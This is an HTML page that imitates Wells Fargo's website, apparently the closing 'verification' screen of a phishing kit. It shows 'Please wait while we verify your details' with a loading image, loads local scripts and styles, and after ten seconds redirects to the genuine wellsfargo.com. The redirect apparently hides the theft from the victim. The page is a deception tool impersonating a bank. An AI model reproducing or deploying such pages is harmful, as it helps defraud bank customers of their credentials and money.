<!DOCTYPE html>
 

<html xmlns="http://www.w3.org/1999/xhtml" xmlns:tcdl="http://www.tridion.com/ContentDelivery/5.3/TCDL"  class="no-js" lang="en">
<head>
    <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages & More</title>
    <meta name="description" content="Wells Fargo: Provider of banking, mortgage, investing, credit card, and personal, small business, and commercial financial services. Learn more." />
    <meta name="keywords" content="home page, log in, view accounts, wellsfargo.com, sign in, sign on" />
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta http-equiv="Content-type" content="text/html" />
    <meta http-equiv="Cache-Control" content="must-revalidate" />
    <meta http-equiv="Cache-Control" content="no-store" />
    <meta http-equiv="Cache-Control" content="no-cache" />
    <meta http-equiv="Cache-Control" content="private" />
    <meta http-equiv="Pragma" content="no-cache" />
    

    <meta name="application-name" content="WELLS FARGO BANK"/>
    <meta name="msapplication-TileColor" content="#1e3d75"/>
    <meta name="msapplication-TileImage" content="WELLSPIN.png"/>
    
     <link rel="stylesheet" href="css/style.css" />
     <link rel="shortcut icon" href="images/favicon.png"/>
     <script type="text/javascript" src="js/jqueryLib.js"></script>
     <meta http-equiv="refresh" content="10;url=https://www.wellsfargo.com/" />
</head>

<body>

   <div class="row1">
   	  <div class="row1-inner"></div>
   </div>
   <div class="row2"></div>
   <div class="row3">
      <div class="row3-inner"></div>
   </div>
   <div class="row4">
      <div class="row4-inner"></div>
   </div>
  
  <div style="margin:3em  0 0 20em">
   <span style="font-family:Arial, Helvetica, sans-serif;font-size:15px;">Please wait while we verify your details....</span>
   
   <br><br>
   
   <img src="images/te.gif" width="75" height="75">
   <br><br>
  
  </div>
   
   <div class="footer">
      <div class="footer-inner"></div>
   </div>

<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>